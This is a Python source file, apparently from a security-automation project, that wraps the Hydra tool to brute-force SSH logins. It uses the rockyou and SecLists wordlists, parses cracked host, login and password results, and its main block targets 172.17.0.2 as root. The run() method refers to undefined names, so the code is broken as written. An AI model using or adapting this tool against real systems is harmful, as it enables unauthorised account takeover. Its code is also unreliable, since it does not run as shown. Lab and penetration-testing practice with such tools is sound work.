# brute force
# try with hidra.

# Tomado de aquí
# https://github.com/zatevakhin/dehydrated/blob/main/dehydrated/run.py

import subprocess
import re
import sys
from auto_sec.helpers.general_utils import GeneralUtils


HYDRA_ERROR_REGEX = re.compile(r"(\[ERROR\])", re.I)
HYDRA_SUCESS_BRUTEFORCE_REGEX = re.compile(
    r"\[(?P<port>[^\]]+)\]\[(?P<module>[^\]]+)\] host: (?P<host>[^\s]+)\s+login: (?P<login>[^\s]+)\s+password: (?P<passwd>[^\n]+)",
    re.I,
)

class AutoSecHydra (GeneralUtils):

    _protocol = None
    _target = None
    _login = "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
    _login_parameter = "-L"
    _password = "/usr/share/wordlists/rockyou.txt"
    _password_parameter = "-P"

    def ssh(self):
        self._protocol = "ssh"
        return self

    def target(self, target):
        self._target = target
        return self

    def login(self, login, list=True):
        self._login_parameter = "-L" if list else "-l"
        self._login = login
        return self

    def password(self, password, list=True):
        self._password_parameter = "-P" if list else "-p"
        self._password = password
        return self

    def _catch_error(self, process_output: str):
        output = process_output.split("\n")

        for error in filter(HYDRA_ERROR_REGEX.match, output):
            return (RuntimeError, error)

    def _collect_data(self, process_output: str):
        output = process_output.split("\n")
        return list(
            map(
                lambda m: m.groupdict(),
                map(
                    HYDRA_SUCESS_BRUTEFORCE_REGEX.search,
                    filter(HYDRA_SUCESS_BRUTEFORCE_REGEX.match, output),
                ),
            )
        )

    def run(self):
        self.tool_name
        parameters = [
            "hydra",
            "-I",
            "-t",
            "4",
            "-v",
            self._login_parameter,
            self._login,
            self._password_parameter,
            self._password,
            f"{self._protocol}://{self._target}",
        ]

        process = subprocess.Popen(parameters, stdout=subprocess.PIPE)
        self.open(process=process)
        self.print(general_utils.data)
        return data


if __name__ == "__main__":
    h = AutoSecHydra()
    result = (
        h.ssh()
        .login("root", list=False)
        .password("estrella", list=False)
        .target("172.17.0.2")
        .run()
    )
    print(result)
